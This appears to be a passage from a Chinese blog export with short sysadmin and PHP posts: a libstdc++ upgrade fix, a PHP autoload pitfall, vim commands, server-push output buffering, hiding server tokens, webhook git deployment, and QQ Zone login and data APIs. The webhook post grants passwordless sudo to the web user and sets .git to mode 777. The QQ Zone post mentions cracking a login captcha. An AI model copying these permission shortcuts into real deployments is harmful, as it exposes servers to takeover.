<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.21&apos; not found (required by node)</span><br><span class="line"></span><br><span class="line">node: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.15&apos; not found (required by node)</span><br><span class="line"></span><br><span class="line">node: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.20&apos; not found (required by node)</span><br></pre></td></tr></table></figure>

<p>运行以下命令检查动态库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strings /usr/lib64/libstdc++.so.6 | grep GLIBC</span><br></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GLIBCXX_3.4</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.1</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.2</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.3</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.4</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.5</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.6</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.7</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.8</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.9</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.10</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.11</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.12</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.13</span><br><span class="line"></span><br><span class="line">GLIBCXX_FORCE_NEW</span><br><span class="line"></span><br><span class="line">GLIBCXX_DEBUG_MESSAGE_LENGTH</span><br></pre></td></tr></table></figure>

<p>从以上输出可以看出，gcc的动态库还是旧版本的。说明出现这些问题，是因为升级gcc时，生成的动态库没有替换老版本gcc的动态库。</p>
<p><strong>问题处理</strong></p>
<p>执行以下命令，查找编译gcc时生成的最新动态库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name "libstdc++.so*"</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so</span><br><span class="line"></span><br><span class="line">/home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6</span><br><span class="line"></span><br><span class="line">/home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21  // 最新动态库</span><br><span class="line"></span><br><span class="line">/home/gcc-5.2.0/gcc-temp是升级gcc时的输出目录。</span><br></pre></td></tr></table></figure>

<p>将上面的最新动态库libstdc++.so.6.0.21复制到/usr/lib64目录下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp   path/libstdc++.so.6.0.21      /usr/lib64</span><br></pre></td></tr></table></figure>

<p>复制后，修改系统默认动态库的指向，即：重建默认库的软连接。</p>
<p>切换工作目录至/usr/lib64：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/lib64</span><br></pre></td></tr></table></figure>

<p>删除原来软连接：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf libstdc++.so.6</span><br></pre></td></tr></table></figure>

<p>将默认库的软连接指向最新动态库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s libstdc++.so.6.0.21 libstdc++.so.6</span><br></pre></td></tr></table></figure>

<p>默认动态库升级完成。重新运行以下命令检查动态库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strings /usr/lib64/libstdc++.so.6 | grep GLIBC</span><br></pre></td></tr></table></figure>

<p>现在输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GLIBCXX_3.4</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.1</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.2</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.3</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.4</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.5</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.6</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.7</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.8</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.9</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.10</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.11</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.12</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.13</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.14</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.15</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.16</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.17</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.18</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.19</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.20</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.21</span><br><span class="line"></span><br><span class="line">GLIBC_2.3</span><br><span class="line"></span><br><span class="line">GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line">GLIBC_2.3.2</span><br><span class="line"></span><br><span class="line">GLIBCXX_FORCE_NEWGLIBCXX_DEBUG_MESSAGE_LENGTH</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>重启nginx后丢失nginx.pid的解决方法</title>
    <url>/articles/%E9%87%8D%E5%90%AFnginx%E5%90%8E%E4%B8%A2%E5%A4%B1nginx-pid%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx -c /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>记一次spl_autoload_register踩坑</title>
    <url>/articles/%E8%AE%B0%E4%B8%80%E6%AC%A1spl-autoload-register%E8%B8%A9%E5%9D%91/</url>
    <content><![CDATA[<blockquote>
<p>定义： spl_autoload_register – 注册给定的函数作为 <a href="https://www.php.net/manual/zh/function.autoload" target="_blank" rel="noopener">__autoload</a> 的实现 <a href="https://www.php.net/manual/zh/function.spl-autoload-register.php" target="_blank" rel="noopener">【官方文档】</a></p>
</blockquote>
<p>简单说就是当我们使用未引用的类时会触发这个函数执行，例如：</p>
<p><img src="/articles/记一次spl-autoload-register踩坑/demo.png" alt="示例1"></p>
<p>根据这个特性，我们可以实现自动的类加载功能，例如:</p>
<p><img src="/articles/记一次spl-autoload-register踩坑/demo2.png" alt="示例2"></p>
<p>一切看起来都是如此美好，但是问题来了，在测试中我发现如下问题：</p>
<p><img src="/articles/记一次spl-autoload-register踩坑/demo3.png" alt="坑"></p>
<p>虽然成功加载了目标类，但是spl_autoload_register被触发了两次，外部实例化类的地方只有一处，显然这是不正常的（红框内的类按照处理逻辑是不应该被加载的）。</p>
<p>经查发现出问题的函数是 <a href="https://www.php.net/manual/zh/function.class-exists" target="_blank" rel="noopener">class_exists</a>：</p>
<p><img src="/articles/记一次spl-autoload-register踩坑/class_exists.png" alt="class_exists"></p>
<p>它的第二个参数 <code>autoload</code> 默认是 <code>true</code>, 这就导致如果指定的类 <code>$class_name</code> 不存在就会触发<a href="https://www.php.net/manual/zh/function.autoload" target="_blank" rel="noopener">__autoload</a>, 而spl_autoload_register是<a href="https://www.php.net/manual/zh/function.autoload" target="_blank" rel="noopener">__autoload</a>的实现,所以spl_autoload_register就被触发了。</p>
<p>解决方法也简单，就是在指定参数autoload为false即可：</p>
<p><img src="/articles/记一次spl-autoload-register踩坑/demo4.png" alt="示例3"></p>
<p><em>注意此处的Demo是放在test目录下面的，和上面示例12Demo放同级目录不同</em></p>
<p>类似的常用方法还有： <code>class_alias</code>, <code>trait_exists</code>,<code>interface_exists</code> 等。</p>
<p>细心的大佬可能会发现在官方文档里面已经有人提出这个问题了：</p>
<p><img src="/articles/记一次spl-autoload-register踩坑/wiki.png" alt></p>
<p>明人不说暗话，这个坑出现在我项目 <a href="https://app.ya2.top/qzone/?from=article" target="_blank" rel="noopener">QQ空间自动导出</a> 里，项目不大所以没有使用三方框架，自己写了一个简单的类自动加载，替代繁琐的require过程。 项目测试运行正常，但是调试的时候发现，接口调用的同时自动模型构建代码被触发执行了，原因是class_exists触发了自动加载，导致substr截取的所有字符串都当做了类来处理，结果碰巧有一个字符串就是我的自动代码构建类，这就很有意思了。</p>
<p>来个简单安全Case：</p>
<p><img src="/articles/记一次spl-autoload-register踩坑/payload.png" alt="payload"></p>
<p>nice~</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>退出vim</title>
    <url>/articles/%E9%80%80%E5%87%BAvim/</url>
    <content><![CDATA[<p>命令</p>
<p>简单说明</p>
<p><code>:w</code></p>
<p>保存编辑后的文件内容，但不退出vim编辑器。这个命令的作用是把内存缓冲区中的数据写到启动vim时指定的文件中。</p>
<p><code>:w!</code></p>
<p>强制写文件，即强制覆盖原有文件。如果原有文件的访问权限不允许写入文件，例如，原有的文件为只读文件，则可使用这个命令强制写入。但是，这种命令用法仅当用户是文件的属主时才适用，而超级用户则不受此限制。</p>
<p><code>:wq</code></p>
<p>保存文件内容后退出vim编辑器。这个命令的作用是把内存缓冲区中的数据写到启动vim时指定的文件中，然后退出vim编辑器。另外一种替代的方法是用ZZ命令。</p>
<p><code>:wq!</code></p>
<p>强制保存文件内容后退出vim编辑器。这个命令的作用是把内存缓冲区中的数据强制写到启动vim时指定的文件中，然后退出vim编辑器。</p>
<p><code>ZZ</code></p>
<p>使用ZZ命令时，如果文件已经做过编辑处理，则把内存缓冲区中的数据写到启动vim时指定的文件中，然后退出vim编辑器。否则只是退出vim而已。注意，ZZ命令前面无需加冒号“：”，也无需按Enter键。</p>
<p><code>:q</code></p>
<p>在未做任何编辑处理而准备退出vim时，可以使用此命令。如果已做过编辑处理，则vim不允许用户使用“:q”命令退出，同时还会输出下列警告信息：</p>
<p>No write since last change (:quit!overrides)</p>
<p><code>:q!</code></p>
<p>强制退出vim编辑器，放弃编辑处理的结果。如果确实不需要保存修改后的文件内容，可输入“:q!”命令，强行退出vim编辑器。</p>
<p><code>:w filename</code></p>
<p>把编辑处理后的结果写到指定的文件中保存</p>
<p><code>:w! filename</code></p>
<p>把编辑处理后的结果强制保存到指定的文件中，如果文件已经存在，则覆盖现有的文件。</p>
<p><code>:wq! filename</code></p>
<p>把编辑处理后的结果强制保存到指定的文件中，如果文件已经存在，则覆盖现有文件，并退出vim编辑器。</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>采用PHP实现”服务器推”技术的聊天室</title>
    <url>/articles/%E9%87%87%E7%94%A8PHP%E5%AE%9E%E7%8E%B0-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8-%E6%8A%80%E6%9C%AF%E7%9A%84%E8%81%8A%E5%A4%A9%E5%AE%A4/</url>
    <content><![CDATA[<p>传统的B/S结构的应用程序，都是采用”客户端拉”结束来实现客户端和服务器端的数据交换。<br>本文将通过结合Ticks(可以参看我的另外一篇文章：<a href="http://www.laruence.com/2008/04/21/101.html" target="_blank" rel="noopener">关于PHP你可能不知道的－PHP的事件驱动化设计</a>)，来实现一个服务器推的PHP聊天室简单构想。</p>
<p>PHPer，尤其是用过set_cookie, header的，一定见过这样的提示信息：”Warning: Cannot modify header information – headers already sent by…..”, 这是因为通过HTTP协议通信，数据包会包含俩个部分，一个是Header,一个是data。一般来说，都是先Header部分，在Heaer部分指明了 Data部分的长度，然后使用\r\n\r\n来表示header部分结束，接下来是Data部分。</p>
<p>当我们有任何输出的时候，Header部分就发送了，这个时候，你再想header函数来改变一些Header部分的域信息，就会得到上面的提示信息。</p>
<p>一个简单的办法就是使用output_buffering。让它来缓存服务器的输出，不要太早将Header部分发给客户端。</p>
<p>那么，如果不使用output_buffering，是不是就可以实现，每当服务器有输出，就立即发送给客户端呢？</p>
<p>做个如下试验：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置php.ini中output_buffering=0 或者使用ob_end_flush()关闭缓存</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">10</span>;$i++)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Now Index is :"</span>. $i;</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果我们发现，还是要等到脚本全部执行完以后，才能一次看到所有的结果。。</p>
<p>为什么呢？</p>
<p>这是因为我们只是解决了缓存问题，但是还有一个缓冲问题，PHP会缓冲程序的输出。所以，这个时候，我们还需要调用，flush(), 来强制使得PHP将所有的程序输出发送给客户端。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置php.ini中output_buffering=0</span></span><br><span class="line">ob_end_flush();<span class="comment">//关闭缓存</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">10</span>;$i++)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Now Index is :"</span>. $i;</span><br><span class="line">  flush();</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在是不是看到了，不断有服务器的数据显示出来(如果看不到, 可以在输出前填充相当数量的占位字符)?</p>
<p>有几个概念之间的关系，我这里补充以下：</p>
<p>在代码中使用ob_start(), 就相当于在php.ini中使用output_buffering=on一样，使用服务器缓存。</p>
<p>在代码中使用ob_end_flush() 就相当于在php.ini中使用output_buffering = false一样，关闭服务器缓存.</p>
<p>基于前面的讨论，我们就有可能使用Ticks来实现，一个无刷新，无ajax的聊天室: 页面中包含俩个iframe,一个是不断获取聊天室的聊天内容，一个包含用户发表聊天内容的form. 这样，在第一个frame的脚本中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ob_end_clean();<span class="comment">//关闭缓存</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ob_implicit_flush(); <span class="comment">//这个语句将强制每当有输出就自动刷新，相当于在每个echo后，调用ob_flush()</span></span><br><span class="line">$new_mesg = <span class="keyword">NULL</span>;</span><br><span class="line">register_tick_function(<span class="string">"getNewMesg"</span>);</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span>(!is_null($new_mesg))&#123;</span><br><span class="line">          <span class="keyword">foreach</span>($new_mesg <span class="keyword">as</span> $msg)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $msg;</span><br><span class="line">          &#125;</span><br><span class="line">          $new_mesg = <span class="keyword">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNewMesg</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//通过查询数据库，或者共享内存，来获取现在的聊天室大厅的内容。</span></span><br><span class="line"><span class="comment">//返回一个数组，包含所有的新的聊天内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就实现了一个简单的使用服务器推技术的聊天室的框架。</p>
<p>当然，关于实时输出，还有一些其他的限制，比如在PHP5手册中讲到的：</p>
<p>个别web服务器程序，特别是Win32下的web服务器程序，在发送结果到浏览器之前，仍然会缓存脚本的输出，直到程序结束为止。</p>
<p>有些Apache的模块，比如mod_gzip，可能自己进行输出缓存，这将导致flush()函数产生的结果不会立即被发送到客户端浏览器。</p>
<p>甚至浏览器也会在显示之前，缓存接收到的内容。例如 Netscape 浏览器会在接受到换行或 html 标记的开头之前缓存内容，并且在接受到</p>
<p>标记之前，不会显示出整个表格。</p>
<p>一些版本的 Microsoft Internet Explorer 只有当接受到的256(甚至更多)个字节以后才开始显示该页面，所以必须发送一些额外的空格来让这些浏览器显示页面内容。</p>
<p>接下来，我贴一个很有趣的代码，有兴趣的同学，可以试试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">header(<span class="string">"Content-type: multipart/x-mixed-replace;boundary=endofsection"</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"--endofsection\n"</span>;</span><br><span class="line">$pmt = <span class="keyword">array</span>(<span class="string">"-"</span>, <span class="string">"\\"</span>, <span class="string">"|"</span>, <span class="string">"/"</span> );</span><br><span class="line"><span class="keyword">for</span>( $i = <span class="number">0</span>; $i &lt;<span class="number">10</span>;$i ++ )</span><br><span class="line">&#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Content-type: text/plain\n\n"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Part $i     "</span>.$pmt[$i % <span class="number">4</span>];</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"--endofsection\n"</span>;</span><br><span class="line">        ob_flush(); <span class="comment">//强制将缓存区的内容输出</span></span><br><span class="line">        flush(); <span class="comment">//强制将缓冲区的内容发送给客户端</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/plain\n\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"The end\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"–endofsection–\n"</span>;</span><br></pre></td></tr></table></figure>

<p>使用firefox打开，看看你看到了什么。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>隐藏服务器token</title>
    <url>/articles/%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8token/</url>
    <content><![CDATA[<p>1、Php</p>
<p><img src="/articles/隐藏服务器token/psb.png" alt></p>
<p>关键词:  <code>expose_php = off</code></p>
<p>2、Nginx</p>
<p>nginx.conf :</p>
<p><img src="/articles/隐藏服务器token/psb2.png" alt> </p>
<p>关键词:  <code>server_tokens off</code></p>
<p>3、Apache</p>
<p><img src="/articles/隐藏服务器token/psb3.png" alt> </p>
<p><strong>ServerSignature</strong></p>
<p>这允许在服务器生成的文档（如错误消息、modproxy 的 ftp 目录列表、modinfo 输出等等）下添加一个显示服务器名称和版本号的页脚行。</p>
<p>它有三个可能的值：</p>
<ul>
<li>On - 允许在服务器生成的文档中添加尾部页脚行</li>
<li>Off - 禁用页脚行</li>
<li>EMail - 创建一个 “mailto:” 引用；用于将邮件发送到所引用文档的 ServerAdmin。</li>
</ul>
<p><strong>ServerTokens</strong></p>
<p>它决定了发送回客户端的服务器响应头字段是否包含服务器操作系统类型的描述和有关已启用的 Apache 模块的信息。</p>
<p>此指令具有以下可能的值（以及在设置特定值时发送到客户端的示例信息）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServerTokens   Full (或者不指定)</span><br><span class="line"></span><br><span class="line">发送给客户端的信息： Server: Apache/2.4.2 (Unix) PHP/4.2.2 MyMod/1.2</span><br><span class="line"></span><br><span class="line">ServerTokens   Prod[uctOnly]</span><br><span class="line"></span><br><span class="line">发送给客户端的信息： Server: Apache</span><br><span class="line"></span><br><span class="line">ServerTokens   Major</span><br><span class="line"></span><br><span class="line">发送给客户端的信息： Server: Apache/2</span><br><span class="line"></span><br><span class="line">ServerTokens   Minor</span><br><span class="line"></span><br><span class="line">发送给客户端的信息： Server: Apache/2.4</span><br><span class="line"></span><br><span class="line">ServerTokens   Min[imal]</span><br><span class="line"></span><br><span class="line">发送给客户端的信息：Server: Apache/2.4.2</span><br><span class="line"></span><br><span class="line">ServerTokens   OS</span><br><span class="line"></span><br><span class="line">发送给客户端的信息： Server: Apache/2.4.2 (Unix)</span><br></pre></td></tr></table></figure>

<p>注意：在 Apache 2.0.44 之后，ServerTokens 也控制由 ServerSignature 指令提供的信息。</p>
<p>为了隐藏 web 服务器版本号、服务器操作系统细节、已安装的 Apache 模块等等，使用你最喜欢的编辑器打开 Apache 配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo vi /etc/apache2/apache2.conf        #Debian/Ubuntu systems</span><br><span class="line"></span><br><span class="line">$ sudo vi /etc/httpd/conf/httpd.conf       #RHEL/CentOS systems</span><br></pre></td></tr></table></figure>

<p>添加/修改/附加下面的行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServerTokens ProdServerSignature Off</span><br></pre></td></tr></table></figure>

<p>保存并退出文件，重启你的 Apache 服务器</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>通过webhook自动部署git项目</title>
    <url>/articles/%E9%80%9A%E8%BF%87webhook%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2git%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>部署脚本 ci.sh: </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /www/project/  <span class="comment">#项目目录</span></span><br><span class="line">sudo <span class="built_in">unset</span> GIT_DIR</span><br><span class="line">sudo git pull</span><br></pre></td></tr></table></figure>

<p>webhook(以php为例):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* check you auth */</span></span><br><span class="line">system(<span class="string">"sudo /xxx/ci.sh 2&gt;&amp;1"</span>); <span class="comment"># xxx表示你ci.sh文件所在目录</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意 1 ：git公钥归属的问题会导致你的 <code>git pull</code> 命令无法执行失败，需要把当前web服务器的用户权限提高</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">su - <span class="comment"># 进入超级用户模式</span></span><br><span class="line">chmod u+w /etc/sudoers  <span class="comment">#添加文件的写权限</span></span><br><span class="line">vim /etc/sudoers <span class="comment"># 编辑文件, 找到这一 行："root ALL=(ALL) ALL"在起下面添加"xxx ALL=(ALL) NOPASSWD:/usr/bin/git"(这里的xxx是你的web服务器的用户,如nginx默认的www)，然后保存退出。</span></span><br><span class="line">chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意 2 ： 出现<code>.git/FETCH_HEAD没有权限</code> 需要提升.git目录权限</p>
</blockquote>
<pre><code class="sh">chmod -R 777  .git</code></pre>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>QQ空间Api</title>
    <url>/articles/QQ%E7%A9%BA%E9%97%B4Api/</url>
    <content><![CDATA[<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><hr>
<h3 id="扫码登录"><a href="#扫码登录" class="headerlink" title="扫码登录"></a>扫码登录</h3><p>下面接口均在PC环境下测试获取，故建议<code>Header</code>里面指定如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">WOW64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/63.0.3239.132</span> <span class="string">Safari/537.36</span></span><br></pre></td></tr></table></figure>

<ol>
<li>获取登录二维码</li>
</ol>
<blockquote>
<p><a href="https://ssl.ptlogin2.qq.com/ptqrshow?appid=549000912&amp;e=2&amp;l=M&amp;s=3&amp;d=72&amp;v=4&amp;t=0.635" target="_blank" rel="noopener">https://ssl.ptlogin2.qq.com/ptqrshow?appid=549000912&amp;e=2&amp;l=M&amp;s=3&amp;d=72&amp;v=4&amp;t=0.635</a> (GET)</p>
</blockquote>
<p>该接口返回一张二维码，在返回cookie中可以获取到qrsig, qrsig值用于检测二维码是否被扫，有点key的作用。 可以通过改变e值控制二维码留白的宽度，改变v值控制二维码的大小</p>
<ol start="2">
<li>检测当前二维码状态</li>
</ol>
<blockquote>
<p><a href="https://ssl.ptlogin2.qq.com/ptqrlogin?u1=https%3A%2F%2Fqzs.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;from_ui=1&amp;ptqrtoken=2009382067&amp;aid=549000912" target="_blank" rel="noopener">https://ssl.ptlogin2.qq.com/ptqrlogin?u1=https%3A%2F%2Fqzs.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;from_ui=1&amp;ptqrtoken=2009382067&amp;aid=549000912</a> (GET)</p>
</blockquote>
<p>参数 ptqrtoken(参考见ptqrtoken生成算法), aid(就是第一步的appid), from_ui=1(必须), Cookie中需要第一步获取的qrsig, 返回结果：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//  `65`:  QRCode 失效</span></span><br><span class="line"> <span class="comment">//  `0` :  验证成功（返回参数中(第3个)包含一个URL，请求这个URL可以得到Cookie）</span></span><br><span class="line"> <span class="comment">//  `66`:  未失效</span></span><br><span class="line"> <span class="comment">//  `67`:  验证中 </span></span><br><span class="line">ptuiCB(<span class="string">'66'</span>,<span class="string">'0'</span>,<span class="string">''</span>,<span class="string">'0'</span>,<span class="string">'二维码未失效。(2717929012)'</span>, <span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<p>这个接口需要轮询，因为扫码这个操作是异步的，而且每个二维码都是有失效的，直到返回码为0 或 65 结束轮询。</p>
<ol start="3">
<li>获取p_skey，完成用户登录</li>
</ol>
<p>第2步中，如果ptuiCB(‘0’,’0’,URL,’0’,’登录成功’, ‘QQ昵称’), 该函数第三个参数会返回一个跳转连接，访问这个跳转连接可以在返回的Cookie中获取得到skey,p_skey以及uin和p_uin,登录才算完成。</p>
<h3 id="账号密码登录"><a href="#账号密码登录" class="headerlink" title="账号密码登录"></a>账号密码登录</h3><ul>
<li>当前卡在破解拖曳验证环节，正在努力探索，敬请期待…</li>
</ul>
<h2 id="数据采集"><a href="#数据采集" class="headerlink" title="数据采集"></a>数据采集</h2><hr>
<h3 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a>API接口</h3><p>下面接口均在H5环境下测试获取，故建议<code>Header</code>里面指定如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(iPhone;</span> <span class="string">CPU</span> <span class="string">iPhone</span> <span class="string">OS</span> <span class="number">10</span><span class="string">_3</span> <span class="string">like</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X)</span> <span class="string">AppleWebKit/602.1.50</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">CriOS/56.0.2924.75</span> <span class="string">Mobile/14E5239e</span> <span class="string">Safari/602.1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">uin=o0QQ号码;</span> <span class="string">skey=@xxx;</span> <span class="string">p_uin=o0QQ号码;</span> <span class="string">p_skey=xxxx</span>  </span><br><span class="line"></span><br><span class="line"><span class="string">//</span> <span class="string">cookie中的参数在登录时候取得,</span> <span class="string">注意每个</span> <span class="string">';'</span> <span class="string">后面有且仅有一个空格</span></span><br></pre></td></tr></table></figure>

<p>接口均需要带上 <code>g_tk</code> 参数辨明当前用户身份, g_tk是根据p_skey算出来的，可参考<a href="#计算g-tk">算法传送</a>.</p>
<p>接口中 <code>fotmat=json</code>表示返回json格式，同时支持 <code>json=html</code>,但是返回JSONP,例如查看访客记录会返回如下:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">_Callback(&#123;</span><br><span class="line">	<span class="string">"code"</span>:<span class="number">0</span>,</span><br><span class="line">	<span class="string">"subcode"</span>:<span class="number">0</span>,</span><br><span class="line">	<span class="string">"message"</span>:<span class="string">""</span>,</span><br><span class="line">	<span class="string">"default"</span>:<span class="number">0</span>,</span><br><span class="line">	<span class="string">"data"</span>: &#123;<span class="string">"count"</span>:<span class="number">0</span>,<span class="string">"lastgettime"</span>:<span class="number">1589267763</span>,<span class="string">"page"</span>:<span class="number">2</span>,<span class="string">"todaycount"</span>:<span class="number">0</span>,<span class="string">"totalcount"</span>:<span class="number">602</span>,<span class="string">"totalpage"</span>:<span class="number">2</span>,<span class="string">"twlogincounts"</span>:<span class="number">0</span>&#125;&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>注意的是 下面的所有接口均允许查看非当前用户信息的，但是需要对方允许你查看，否则会返回如下：</p>
